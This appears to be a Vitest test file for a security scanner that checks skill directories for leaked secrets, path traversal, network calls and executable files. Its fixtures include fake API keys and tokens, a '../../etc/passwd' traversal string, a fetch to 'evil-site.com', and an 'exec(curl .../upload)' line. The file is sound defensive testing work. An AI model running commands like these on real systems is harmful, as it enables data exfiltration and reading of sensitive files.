import { describe, it, expect } from 'vitest';
import {
  scanForSecrets,
  checkPathTraversal,
  checkContentPathTraversal,
  checkExternalDependencies,
  checkUnsafeExtensions,
  runSecurityScan,
} from './security';

describe('scanForSecrets', () => {
  it('should detect API key patterns', () => {
    const content = 'api_key: "sk-1234567890abcdef"';
    const { findings, errorCount } = scanForSecrets('test.ts', content);
    expect(errorCount).toBeGreaterThan(0);
    expect(findings[0].severity).toBe('error');
    expect(findings[0].path).toBe('test.ts');
  });

  it('should detect AWS access keys', () => {
    const content = 'const key = "AKIAIOSFODNN7EXAMPLE"';
    const { findings, errorCount } = scanForSecrets('config.ts', content);
    expect(errorCount).toBeGreaterThan(0);
  });

  it('should detect GitHub tokens', () => {
    const content = 'export GH_TOKEN="ghp_1234567890abcdefghijklmnopqrstuv"';
    const { findings, errorCount } = scanForSecrets('env.ts', content);
    expect(errorCount).toBeGreaterThan(0);
  });

  it('should detect private keys', () => {
    const content = '-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBg...\n-----END PRIVATE KEY-----';
    const { findings, errorCount } = scanForSecrets('key.pem', content);
    expect(errorCount).toBeGreaterThan(0);
  });

  it('should detect JWT tokens', () => {
    const content = 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.abc123def456';
    const { findings, errorCount } = scanForSecrets('auth.ts', content);
    expect(errorCount).toBeGreaterThan(0);
  });

  it('should pass clean content', () => {
    const content = 'const greeting = "Hello, World!";\nconst version = "1.0.0";';
    const { findings, errorCount } = scanForSecrets('clean.ts', content);
    expect(errorCount).toBe(0);
    expect(findings).toHaveLength(0);
  });

  it('should pass example keys (without values)', () => {
    const content = '// Set api_key in your environment variables\nconst api_key = process.env.API_KEY;';
    const { errorCount } = scanForSecrets('config.ts', content);
    expect(errorCount).toBe(0);
  });
});

describe('checkPathTraversal', () => {
  it('should detect hidden sensitive files', () => {
    const findings = checkPathTraversal(['src/.env']);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].severity).toBe('error');
    expect(findings[0].message).toContain('.env');
  });

  it('should detect path traversal patterns in file paths', () => {
    const findings = checkPathTraversal(['scripts/../../etc/passwd']);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should pass normal file paths', () => {
    const findings = checkPathTraversal(['src/index.ts', 'references/doc.md']);
    expect(findings).toHaveLength(0);
  });
});

describe('checkContentPathTraversal', () => {
  it('should detect path traversal in file content', () => {
    const content = 'const path = "../../etc/passwd";';
    const findings = checkContentPathTraversal('script.ts', content);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should pass content without traversal patterns', () => {
    const content = 'const dir = path.join(__dirname, "data");';
    const findings = checkContentPathTraversal('utils.ts', content);
    expect(findings).toHaveLength(0);
  });
});

describe('checkExternalDependencies', () => {
  it('should detect network access patterns', () => {
    const content = 'const res = await fetch("https://evil-site.com/data");';
    const { hasNetworkAccess, findings } = checkExternalDependencies('script.ts', content);
    expect(hasNetworkAccess).toBe(true);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should detect curl commands', () => {
    const content = 'exec("curl https://unknown-api.com/upload")';
    const { hasNetworkAccess } = checkExternalDependencies('install.sh', content);
    expect(hasNetworkAccess).toBe(true);
  });

  it('should whitelist GitHub domains', () => {
    const content = 'const res = await fetch("https://api.github.com/repos/test");\nconst raw = await fetch("https://raw.githubusercontent.com/test");';
    const { hasNetworkAccess, findings } = checkExternalDependencies('gh.ts', content);
    expect(hasNetworkAccess).toBe(false);
    expect(findings).toHaveLength(0);
  });

  it('should pass content without network access', () => {
    const content = 'const x = 1 + 1;\nconsole.log(x);';
    const { hasNetworkAccess } = checkExternalDependencies('pure.ts', content);
    expect(hasNetworkAccess).toBe(false);
  });
});

describe('checkUnsafeExtensions', () => {
  it('should warn about .exe files', () => {
    const findings = checkUnsafeExtensions(['scripts/tool.exe']);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('should pass safe extensions', () => {
    const findings = checkUnsafeExtensions(['scripts/helper.ts', 'scripts/setup.py']);
    expect(findings).toHaveLength(0);
  });
});

describe('runSecurityScan', () => {
  it('should pass a clean skill directory', () => {
    const result = runSecurityScan([
      { path: 'SKILL.md', content: '---\nname: my-skill\n---\n\n# My Skill' },
      { path: 'README.md', content: '# Readme' },
      { path: 'scripts/helper.ts', content: 'export function hello() { return "hi"; }' },
    ]);
    expect(result.passed).toBe(true);
    expect(result.needsManualReview).toBe(false);
  });

  it('should fail with secrets in content', () => {
    const result = runSecurityScan([
      { path: 'SKILL.md', content: '---\nname: my-skill\n---\n\n# My Skill' },
      { path: 'config.ts', content: 'api_key = "sk-secret-abc123"' },
    ]);
    expect(result.passed).toBe(false);
    expect(result.findings.some((f) => f.severity === 'error')).toBe(true);
  });

  it('should mark for manual review with network access', () => {
    const result = runSecurityScan([
      { path: 'SKILL.md', content: '---\nname: my-skill\n---\n\n# My Skill' },
      { path: 'scripts/fetch.ts', content: 'fetch("https://unknown-api.com/data")' },
    ]);
    expect(result.needsManualReview).toBe(true);
  });

  it('should detect .env hidden files', () => {
    const result = runSecurityScan([
      { path: 'SKILL.md' },
      { path: '.env' },
    ]);
    expect(result.passed).toBe(false);
  });
});
